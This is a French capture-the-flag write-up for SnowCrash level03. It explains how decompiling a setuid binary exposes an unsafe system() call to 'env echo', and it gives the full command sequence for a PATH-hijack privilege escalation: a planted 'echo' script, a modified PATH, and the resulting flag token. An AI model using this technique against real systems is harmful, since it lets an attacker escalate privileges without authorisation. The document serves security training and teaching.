
Pour ce level03, nous avons un executable dans le dossier courant appartenant a flag03 et que l'on peux executer avec les droits de flag03 -rw`s`r-`s`-r-x (le `s` signifiant de l'executer avec les droits du owner du fichier)

```
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

Lorsque l'on execute le fichier on a cette output:

```
level03@SnowCrash:~$ ./level03 
Exploit me
```

On decide d'utiliser un decompiler de fichier pour essayer de comprendre le code qu'il execute donc avec scp on recupere le fichier et on le mets sur ce site :

[Decompiler explorer](https://dogbolt.org/)

```
scp -P 4242 level03@192.168.56.104:level03 Downloads 
```

On recupere donc ce code

```
int32_t main(int32_t argc, char** argv, char** envp)
{
    gid_t eax = getegid();
    uid_t eax_1 = geteuid();
    setresgid(eax, eax, eax);
    setresuid(eax_1, eax_1, eax_1);
    return system("/usr/bin/env echo Exploit me");
}
```

On vois que le programme fais un appel a `echo` directement en passant par le PATH du terminal donc nous ecrivons un fichier `/var/crash/echo` contenant l'instruction `getflag` et lui donnons les droits d'executions

```
level03@SnowCrash:/var/crash$ touch echo
level03@SnowCrash:/var/crash$ echo getflag > echo
level03@SnowCrash:/var/crash$ cat echo
getflag
level03@SnowCrash:/var/crash$ chmod 777 echo
```

Nous modifions le PATH pour appeler notre echo

```
export PATH=/var/crash:$PATH
```

Nous executons `level03`

```
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```


> ### NEXT : [Level 04](https://github.com/Seriots/snowcrash/tree/master/level04/resources/README.md)
